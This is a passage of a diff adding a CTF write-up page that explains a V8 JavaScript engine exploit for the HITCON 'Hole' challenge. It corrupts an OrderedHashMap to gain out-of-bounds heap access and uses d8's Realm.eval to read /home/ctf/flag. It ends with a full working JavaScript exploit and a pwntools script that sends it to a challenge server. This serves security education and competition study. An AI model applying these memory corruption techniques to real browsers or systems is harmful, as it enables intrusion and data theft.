+        <span class="n">CAST</span><span class="p">(</span><span class="n">LoadObjectField</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">NumberOfElementsOffset</span><span class="p">())));</span>
+    <span class="c1">// Read the number of deleted elements.</span>
+    <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">IntPtrT</span><span class="o">&gt;</span> <span class="n">number_of_deleted</span> <span class="o">=</span> <span class="n">SmiUntag</span><span class="p">(</span><span class="n">CAST</span><span class="p">(</span><span class="n">LoadObjectField</span><span class="p">(</span>
+        <span class="n">table</span><span class="p">,</span> <span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">NumberOfDeletedElementsOffset</span><span class="p">())));</span>
+    <span class="c1">// occupancy = number_of_elements + number_of_deleted</span>
+    <span class="n">occupancy</span> <span class="o">=</span> <span class="n">IntPtrAdd</span><span class="p">(</span><span class="n">number_of_elements</span><span class="p">,</span> <span class="n">number_of_deleted</span><span class="p">);</span>
+    <span class="n">GotoIf</span><span class="p">(</span><span class="n">IntPtrLessThan</span><span class="p">(</span><span class="n">occupancy</span><span class="p">.</span><span class="n">value</span><span class="p">(),</span> <span class="n">capacity</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">store_new_entry</span><span class="p">);</span>
+
+    <span class="c1">// ...</span>
+  <span class="p">}</span>
+  <span class="n">BIND</span><span class="p">(</span><span class="o">&amp;</span><span class="n">store_new_entry</span><span class="p">);</span>
+  <span class="c1">// Store the key, value and connect the element to the bucket chain.</span>
+  <span class="n">StoreOrderedHashMapNewEntry</span><span class="p">(</span><span class="n">table_var</span><span class="p">.</span><span class="n">value</span><span class="p">(),</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span>
+                              <span class="n">entry_start_position_or_hash</span><span class="p">.</span><span class="n">value</span><span class="p">(),</span>
+                              <span class="n">number_of_buckets</span><span class="p">.</span><span class="n">value</span><span class="p">(),</span> <span class="n">occupancy</span><span class="p">.</span><span class="n">value</span><span class="p">());</span>
+  <span class="n">Return</span><span class="p">(</span><span class="n">receiver</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="n">CollectionsBuiltinsAssembler</span><span class="o">::</span><span class="n">StoreOrderedHashMapNewEntry</span><span class="p">(</span>
+    <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">OrderedHashMap</span><span class="o">&gt;</span> <span class="n">table</span><span class="p">,</span> <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">key</span><span class="p">,</span>
+    <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span> <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">IntPtrT</span><span class="o">&gt;</span> <span class="n">hash</span><span class="p">,</span>
+    <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">IntPtrT</span><span class="o">&gt;</span> <span class="n">number_of_buckets</span><span class="p">,</span> <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">IntPtrT</span><span class="o">&gt;</span> <span class="n">occupancy</span><span class="p">)</span> <span class="p">{</span>
+
+  <span class="c1">// bucket = hash &amp; (number_of_buckets - 1)</span>
+  <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">IntPtrT</span><span class="o">&gt;</span> <span class="n">bucket</span> <span class="o">=</span>
+      <span class="n">WordAnd</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span> <span class="n">IntPtrSub</span><span class="p">(</span><span class="n">number_of_buckets</span><span class="p">,</span> <span class="n">IntPtrConstant</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+  <span class="c1">// bucket_entry = table[3 + bucket]</span>
+  <span class="c1">// this is the index in the data table at which the bucket begins</span>
+  <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Smi</span><span class="o">&gt;</span> <span class="n">bucket_entry</span> <span class="o">=</span> <span class="n">CAST</span><span class="p">(</span><span class="n">UnsafeLoadFixedArrayElement</span><span class="p">(</span>
+      <span class="n">table</span><span class="p">,</span> <span class="n">bucket</span><span class="p">,</span> <span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">HashTableStartIndex</span><span class="p">()</span> <span class="o">*</span> <span class="n">kTaggedSize</span><span class="p">));</span>
+
+  <span class="c1">// Store the entry elements.</span>
+  <span class="c1">// entry_start = occupancy * 3 + number_of_buckets</span>
+  <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">IntPtrT</span><span class="o">&gt;</span> <span class="n">entry_start</span> <span class="o">=</span> <span class="n">IntPtrAdd</span><span class="p">(</span>
+      <span class="n">IntPtrMul</span><span class="p">(</span><span class="n">occupancy</span><span class="p">,</span> <span class="n">IntPtrConstant</span><span class="p">(</span><span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">kEntrySize</span><span class="p">)),</span>
+      <span class="n">number_of_buckets</span><span class="p">);</span>
+
+  <span class="c1">// table[3 + number_of_buckets + occupancy * 3] = key</span>
+  <span class="n">UnsafeStoreFixedArrayElement</span><span class="p">(</span>
+      <span class="n">table</span><span class="p">,</span> <span class="n">entry_start</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">UPDATE_WRITE_BARRIER</span><span class="p">,</span>
+      <span class="n">kTaggedSize</span> <span class="o">*</span> <span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">HashTableStartIndex</span><span class="p">());</span>
+  <span class="c1">// table[3 + number_of_buckets + occupancy * 3 + 1] = value</span>
+  <span class="n">UnsafeStoreFixedArrayElement</span><span class="p">(</span>
+      <span class="n">table</span><span class="p">,</span> <span class="n">entry_start</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">UPDATE_WRITE_BARRIER</span><span class="p">,</span>
+      <span class="n">kTaggedSize</span> <span class="o">*</span> <span class="p">(</span><span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">HashTableStartIndex</span><span class="p">()</span> <span class="o">+</span>
+                     <span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">kValueOffset</span><span class="p">));</span>
+  <span class="c1">// table[3 + number_of_buckets + occupancy * 3 + 2] = bucket_entry</span>
+  <span class="n">UnsafeStoreFixedArrayElement</span><span class="p">(</span>
+      <span class="n">table</span><span class="p">,</span> <span class="n">entry_start</span><span class="p">,</span> <span class="n">bucket_entry</span><span class="p">,</span>
+      <span class="n">kTaggedSize</span> <span class="o">*</span> <span class="p">(</span><span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">HashTableStartIndex</span><span class="p">()</span> <span class="o">+</span>
+                     <span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">kChainOffset</span><span class="p">));</span>
+
+  <span class="c1">// Update the bucket head.</span>
+  <span class="c1">// table[3 + bucket] = occupancy</span>
+  <span class="n">UnsafeStoreFixedArrayElement</span><span class="p">(</span>
+      <span class="n">table</span><span class="p">,</span> <span class="n">bucket</span><span class="p">,</span> <span class="n">SmiTag</span><span class="p">(</span><span class="n">occupancy</span><span class="p">),</span>
+      <span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">HashTableStartIndex</span><span class="p">()</span> <span class="o">*</span> <span class="n">kTaggedSize</span><span class="p">);</span>
+
+  <span class="c1">// Bump the elements count.</span>
+  <span class="c1">// table[0]++</span>
+  <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Smi</span><span class="o">&gt;</span> <span class="n">number_of_elements</span> <span class="o">=</span>
+      <span class="n">CAST</span><span class="p">(</span><span class="n">LoadObjectField</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">NumberOfElementsOffset</span><span class="p">()));</span>
+  <span class="n">StoreObjectFieldNoWriteBarrier</span><span class="p">(</span><span class="n">table</span><span class="p">,</span>
+                                 <span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">NumberOfElementsOffset</span><span class="p">(),</span>
+                                 <span class="n">SmiAdd</span><span class="p">(</span><span class="n">number_of_elements</span><span class="p">,</span> <span class="n">SmiConstant</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>After setting <code class="language-plaintext highlighter-rouge">number_of_elements</code> to -1 the exploit inserts <code class="language-plaintext highlighter-rouge">(0x10, -1)</code> into the table. <code class="language-plaintext highlighter-rouge">number_of_buckets</code> is 2 which is the default for new tables. <code class="language-plaintext highlighter-rouge">number_of_deleted</code> is 0 because the table got shrunk twice (visible in the memory dump from the previous point), so <code class="language-plaintext highlighter-rouge">occupancy</code> will also be -1. The newly-inserted entry is 3 words long and is stored at <code class="language-plaintext highlighter-rouge">table[3 + number_of_buckets + occupancy * 3]</code> which in this case is equal to <code class="language-plaintext highlighter-rouge">table[2]</code>. That means that the key (0x10) will overwrite the bucket count. The value (-1) will overwrite the pointer to the first bucket, which is fine because -1 indicates an empty bucket. Finally, the element count is incremented, to 0.</p>
+
+<p>The next time the exploit inserts <code class="language-plaintext highlighter-rouge">(a, 0xffff)</code> into the table. This time <code class="language-plaintext highlighter-rouge">occupancy</code> is 0 but <code class="language-plaintext highlighter-rouge">number_of_buckets</code> is 16, so the new entry gets written at <code class="language-plaintext highlighter-rouge">table[19]</code>, which is 3 words after the end of the table. This works and doesn’t crash because the code uses <code class="language-plaintext highlighter-rouge">UnsafeStoreFixedArrayElement</code>, which <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/codegen/code-stub-assembler.h;l=1811;drc=2df668b7cbf6c1d0766b6ee0ae8147adc8830f2e">does not emit a bounds check</a> to store the entries into the table. So even though the length of the FixedArray that backs the table is known, it’s not checked when inserting new elements.</p>
+
+<p>The exploit allocates a JavaScript array right after the map, so the new entry will be written 8 bytes into the object that represents this array. The memory layout of a <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-array.tq;l=52;drc=6013fdbac99726a1775f77d03699088a46d12483">JSArray</a> is the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>map: Map
+properties_or_hash: FixedArray
+elements: FixedArray
+length: Number
+</code></pre></div></div>
+
+<p>The inserted pair overwrites <code class="language-plaintext highlighter-rouge">elements</code> with the address of the array itself and <code class="language-plaintext highlighter-rouge">length</code> with 0xffff. This gives us an arbitrary out-of-bounds read and write on the JavaScript heap.</p>
+
+<h3 id="v8-sandbox">V8 Sandbox</h3>
+
+<p>Recent versions of V8 enable the <a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit">V8 sandbox</a> by default. The goal of the V8 sandbox is to prevent an attacker that has gained arbitrary read and write on the JavaScript heap from corrupting other memory and getting arbitrary code execution in the V8 process. To get the flag we either need to find a bypass for the sandbox. Or we could find a way to get the flag <em>into</em> the sandbox instead.</p>
+
+<p>As luck would have it, there is a function in d8 which does exactly that and that the author’s patch doesn’t remove from the globals.</p>
+
+<p>d8 exposes a <code class="language-plaintext highlighter-rouge">Realm</code> object which has a function called <code class="language-plaintext highlighter-rouge">Realm.eval</code> that can load other JavaScript files. The implementation is <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/d8/d8.cc;l=2111;drc=d030a17ad0ce961375e5e8d47cdc3e570b5a8fab">here</a> and calls <code class="language-plaintext highlighter-rouge">Shell::ReadSource</code>, which in turn calls <code class="language-plaintext highlighter-rouge">Shell::ReadFile</code>. This doesn’t directly give us access to the contents of the file that we’re loading but it will still load its contents onto the JavaScript heap, where we can read it using our OOB array. This completely bypasses the need for a V8 sandbox escape as long as we know where the flag is located. By reading <code class="language-plaintext highlighter-rouge">/etc/passwd</code> we can see that there is a user called <code class="language-plaintext highlighter-rouge">ctf</code> on the server, so we can try <code class="language-plaintext highlighter-rouge">/home/ctf/flag</code>. By sheer luck our guess was correct and we could use this method to read the flag.</p>
+
+<p><code class="language-plaintext highlighter-rouge">hitcon{tH3_xPl01t_n0_l0ng3r_wOrk_aF+3r_66c8de2cdac10cad9e622ecededda411b44ac5b3_:((}</code></p>
+
+<h2 id="final-exploit">Final exploit</h2>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Utilities to convert between representations</span>
+<span class="kd">let</span> <span class="nx">f64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">u8view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">f64view</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
+
+<span class="kd">let</span> <span class="nx">hole</span> <span class="o">=</span> <span class="p">[].</span><span class="nx">hole</span><span class="p">();</span>
+<span class="kd">let</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Map</span><span class="p">();</span>
+<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">hole</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">);</span>
+
+<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>
+
+<span class="c1">// Load the contents of the flag into the heap</span>
+<span class="k">try</span> <span class="p">{</span>
+    <span class="nx">Realm</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/home/ctf/flag</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">classic</span><span class="dl">'</span><span class="p">});</span>
+<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Dump the heap</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(...</span><span class="nx">u8view</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">'35.227.151.88'</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">30262</span>
+
+<span class="n">pow_re</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="sa">rb</span><span class="s">'hashcash -mb25 ([a-zA-Z0-9]+)'</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">challenge</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">challenge</span><span class="p">)</span>
+<span class="n">match</span> <span class="o">=</span> <span class="n">pow_re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">challenge</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">'hashcash'</span><span class="p">,</span> <span class="s">'-mb25'</span><span class="p">,</span> <span class="n">match</span><span class="p">]).</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+
+<span class="n">exploit</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="s">'pwn.js'</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your javscript file size: ( MAX: 2000 bytes )'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">exploit</span><span class="p">)).</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Input your javascript file:'</span><span class="p">,</span> <span class="n">exploit</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'hitcon\{[ -~]+\}'</span><span class="p">,</span> <span class="n">s</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+
+<ul>
+  <li><a href="./fourchain-prologue">Prologue</a>: Introduction</li>
+  <li><strong><a href="./fourchain-hole">Chapter 1: Hole</a> (You are here)</strong></li>
+  <li><a href="./fourchain-sandbox">Chapter 2: Sandbox</a>: Pwning the Chrome Sandbox using <code class="language-plaintext highlighter-rouge">Sandbox</code>.</li>
+  <li><a href="./fourchain-kernel">Chapter 3: Kernel</a>: Chaining the Cross-Cache Cred Change</li>
+  <li><a href="./fourchain-hv">Chapter 4: Hypervisor</a>: Lord of the MMIO: A Journey to IEM</li>
+  <li><a href="./fourchain-fullchain">Chapter 5: One for All</a>: Uncheesing a Challenge and GUI Troubles</li>
+  <li><a href="./fourchain-epilogue">Epilogue</a>: Closing thoughts</li>
+</ul>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
